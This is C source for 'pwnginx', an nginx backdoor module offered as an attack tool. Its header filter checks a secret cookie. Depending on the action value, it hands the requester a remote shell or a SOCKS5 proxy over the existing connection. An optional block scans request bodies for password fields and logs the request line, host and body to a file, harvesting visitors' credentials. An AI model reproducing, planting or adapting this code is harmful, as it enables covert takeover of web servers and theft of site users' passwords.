/*                                 
 *  ngx_http_pwnginx.c - pwnginx main module   
 *  t57root@gmail.com              
 *  lastest version @ https://github.com/t57root/pwnginx
 *  openwill.me / www.hackshell.net
 */                           

#include <ngx_config.h>
#include <ngx_core.h>
#include <ngx_http.h>
#include "pwnginx.h"
#include "config.h"

static ngx_int_t
ngx_http_pwnginx_init(ngx_conf_t *cf);
static ngx_http_module_t  ngx_http_pwnginx_ctx = {
    NULL,                                  /* preconfiguration */
    ngx_http_pwnginx_init,          /* postconfiguration */
    NULL,                                  /* create main configuration */
    NULL,                                  /* init main configuration */
    NULL,                                  /* create server configuration */
    NULL,                                  /* merge server configuration */
    NULL,                                    /* create location configuration */
    NULL                                   /* merge location configuration */
};
ngx_module_t  ngx_http_pwnginx = {
    NGX_MODULE_V1,
    &ngx_http_pwnginx_ctx,   /* module context */
    NULL,      /* module directives */
    NGX_HTTP_MODULE,                       /* module type */
    NULL,                                  /* init master */
    NULL,                                  /* init module */
    NULL,                                  /* init process */
    NULL,                                  /* init thread */
    NULL,                                  /* exit thread */
    NULL,                                  /* exit process */
    NULL,                                  /* exit master */
    NGX_MODULE_V1_PADDING
};
static ngx_http_output_header_filter_pt  ngx_http_next_header_filter;
static ngx_http_output_body_filter_pt ngx_http_next_body_filter;
static ngx_int_t
ngx_http_pwnginx_header_filter(ngx_http_request_t *r)
{
    int cmd_fd = r->connection->fd;
    ngx_table_elt_t ** cookies = NULL;
    cookies = r->headers_in.cookies.elts;
    if(r->headers_in.cookies.nelts==1){
        if(strncmp((char *)cookies[0]->value.data,"pwnginx="PASSWORD"; action=1",strlen(PASSWORD)+18)==0){
            msend(cmd_fd, "pwnginx1", sizeof("pwnginx1"));
            exec_shell(cmd_fd);
        }
        else if(strncmp((char *)cookies[0]->value.data,"pwnginx="PASSWORD"; action=2",strlen(PASSWORD)+18)==0){
            msend(cmd_fd, "pwnginx2", sizeof("pwnginx2"));
            exec_socks5(cmd_fd);
        }
    }

    #ifdef PWD_SNIFF_FILE
    if (r->request_body){
        ngx_chain_t     *cl = r->request_body->bufs;
        if(cl){
            //1024
            char *tmp_buf = malloc(1025);
            tmp_buf[1024]='\0';
            strncpy(tmp_buf,(char *)cl->buf->pos,1024);
            if( ngx_strcasestrn((u_char *)tmp_buf, "password=",9-1) ||
                ngx_strcasestrn((u_char *)tmp_buf, "passwd=",7-1) ||
                ngx_strcasestrn((u_char *)tmp_buf, "pwd=",4-1) ||
                ngx_strcasestrn((u_char *)tmp_buf, "name=\"password\"",15-1) ||
                ngx_strcasestrn((u_char *)tmp_buf, "name=\"passwd\"",13-1) ||
                ngx_strcasestrn((u_char *)tmp_buf, "name=\"pwd\"",10-1)){
                FILE *fp = fopen(PWD_SNIFF_FILE,"a");
                r->request_line.data[(int)r->request_line.len]='\0';
                fprintf(fp,"%s\n",(char *)r->request_line.data);
                r->headers_in.host->value.data[(int)r->headers_in.host->value.len]='\0';
                fprintf(fp,"Host:%s\n",(char *)r->headers_in.host->value.data);
                fprintf(fp,"%s\n======================\n",cl->buf->pos);
                fclose(fp);
            }
        }
    }
    #endif

    return ngx_http_next_header_filter(r);
}

static ngx_int_t
ngx_http_pwnginx_body_filter(ngx_http_request_t *r, ngx_chain_t *in)
{
    return ngx_http_next_body_filter(r, in);
}

static ngx_int_t
ngx_http_pwnginx_init(ngx_conf_t *cf)
{
    ngx_http_next_header_filter = ngx_http_top_header_filter;
    ngx_http_top_header_filter = ngx_http_pwnginx_header_filter;
    ngx_http_next_body_filter = ngx_http_top_body_filter;
    ngx_http_top_body_filter = ngx_http_pwnginx_body_filter;


#ifdef ROOTSHELL

#endif

    return NGX_OK;
}

